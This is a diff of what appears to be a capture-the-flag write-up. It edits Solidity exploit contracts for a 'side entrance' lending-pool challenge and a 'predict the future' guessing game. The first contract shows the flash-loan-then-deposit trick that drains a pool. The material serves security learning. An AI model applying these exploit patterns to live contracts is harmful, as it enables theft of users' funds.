@@ -231,7 +231,7 @@ All of the above steps can be performed with a single function call to `attack` 
 2. you must specify `amount = 42000000000000000000` when calling `attack`.
 
 ```solidity
-// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: UNLICENSE
 pragma solidity ^0.8.0;
 
 import "./SideEntranceLenderPool.sol";
@@ -247,8 +247,7 @@ contract SideEntranceLenderPoolAttacker {
     receive() external payable {}
 
     function execute() external payable {
-        (bool success, ) = msg.sender.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
-        require(success, "Deposit failed");
+        sideEntranceLenderPool.deposit{value: msg.value}();
     }
 
     function attack(uint256 amount) external {
@@ -518,6 +517,8 @@ contract ExploitContract {
         predictTheFuture = _predictTheFuture;
     }
 
+    receive() external payable {} 
+
     function lockInGuess() external payable {
         predictTheFuture.lockInGuess{value: 1 ether}(0);
     }
@@ -526,8 +527,6 @@ contract ExploitContract {
         predictTheFuture.settle();
         require(predictTheFuture.isComplete(), "Exploit failed");
     }
-
-    receive() external payable {} 
 }
 ```
 
